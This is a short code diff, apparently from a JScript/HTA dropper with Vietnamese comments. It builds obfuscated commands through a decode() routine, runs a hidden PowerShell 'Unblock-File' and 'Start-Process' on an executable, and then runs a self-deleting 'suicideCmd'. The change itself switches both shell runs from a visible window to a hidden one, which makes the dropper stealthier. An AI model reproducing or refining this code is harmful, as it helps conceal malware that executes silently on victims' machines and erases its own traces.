@@ -62,7 +62,7 @@
                     // Cong chuoi hoan chinh
                     var execCmd = decode(nA, 363) + decode(nB, 363) + t + decode(nC, 363) + t + decode(nD, 363);
 
-                    sh.Run(execCmd, 1, false);
+                    sh.Run(execCmd, 0, false);
                 }
 
                 //          powershell -w h -c "Unblock-File 'C:\path\to\file.exe'; Start-Process 'C:\path\to\file.exe'"
@@ -79,7 +79,7 @@
 
                 // Lắp ráp biến p ở giữa
                 var suicideCmd = decode(nA, 363) + p + decode(nB, 363);
-                sh.Run(suicideCmd, 1, false);
+                sh.Run(suicideCmd, 0, false);
 
             } catch (e) {}
             window.close();
